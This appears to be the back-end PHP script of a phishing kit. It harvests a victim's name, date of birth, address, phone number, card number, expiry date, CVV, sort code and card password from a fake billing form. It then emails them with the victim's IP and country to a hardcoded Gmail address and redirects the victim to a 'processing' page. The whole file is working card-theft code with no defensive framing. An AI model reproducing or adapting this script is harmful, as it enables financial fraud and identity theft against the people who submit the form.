<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$url="http://www.trouver-ip.com/index.php?ip=".$ip;
$s=file_get_contents($url);
$n=explode('flags/', $s);
$s=explode('.png', $n[1]);
$pays=$s[0];
$bilsmg .= "Codec By DeVr0$ & X-Ray\n";
$bilsmg .= "#################################\n";
$bilsmg .= "Name         : ".$_POST['jar1']."\n";
$bilsmg .= "Date of Birth: ".$_POST['jar2']."/";
$bilsmg .= "".$_POST['jar3']."/";
$bilsmg .= "".$_POST['jar4']."\n";
$bilsmg .= "Address      : ".$_POST['jar5']."\n";
$bilsmg .= "City         : ".$_POST['jar7']."\n";
$bilsmg .= "State        : ".$_POST['jar8']."\n";
$bilsmg .= "Country      : ".$_POST['jar9']."\n";
$bilsmg .= "Zip code     : ".$_POST['jar10']."\n";
$bilsmg .= "Phone        : ".$_POST['jar11']."\n";
$bilsmg .= "#################################\n";
$bilsmg .= "Card Number: ".$_POST['jar12']."\n";
$bilsmg .= "Expiration Date: ".$_POST['jar13']."/";
$bilsmg .= "".$_POST['jar14']."\n";
$bilsmg .= "Cvv       : ".$_POST['jar15']."\n";
$bilsmg .= "Sort Code : ".$_POST['jar16']."\n";
$bilsmg .= "Card Password : ".$_POST['jar17']."\n";
$bilsmg .= "#################################\n";

$bilsnd = "spammeryassine6@gmail.com";
$bilsub = "|~ CC Fr0m : $pays ~| [$ip] =?UTF-8?Q?=E2=9C=89_?=";
$bilhead = "From: Billing =?UTF-8?Q?=E2=9C=89_?= <localhost>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

header("Location: proccessing.php");
?>